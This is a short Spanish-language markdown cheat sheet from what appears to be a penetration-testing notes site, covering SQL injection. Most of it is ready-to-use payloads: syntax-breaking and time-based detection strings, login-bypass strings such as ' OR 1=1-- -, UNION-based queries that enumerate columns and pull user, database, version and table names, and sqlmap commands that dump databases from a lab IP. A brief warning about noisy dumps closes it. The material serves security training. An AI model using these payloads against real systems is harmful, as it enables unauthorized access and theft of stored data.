---
title: Inyección SQL
order: 1
description: Detección y explotación de SQLi — bypass de login, UNION-based, extracción de datos y automatización con sqlmap.
---

## ¿Qué es?

Una **SQL Injection** ocurre cuando la entrada del usuario se concatena directamente en una consulta SQL sin sanitizar, permitiendo alterar su lógica.

## Detección

Inyecta caracteres que rompan la sintaxis y observa errores o cambios:

```sql
'
"
' OR '1'='1
1' AND SLEEP(5)-- -
```

## Bypass de autenticación

```sql
admin' -- -
admin' #
' OR 1=1-- -
```

## UNION-based

Primero averigua el número de columnas:

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -   # hasta que falle
```

Luego extrae datos:

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT user(),database(),version()-- -
' UNION SELECT table_name,2,3 FROM information_schema.tables-- -
```

## Automatización con sqlmap

```bash wrap=false
sqlmap -u "http://10.10.10.10/page.php?id=1" --batch --dbs
sqlmap -u "http://10.10.10.10/page.php?id=1" -D mibd --tables
sqlmap -r request.txt --batch --dump
```

> [!WARNING]
> En auditorías reales, `--dump` masivo puede ser destructivo o ruidoso. Acota con `-T`/`-C`.
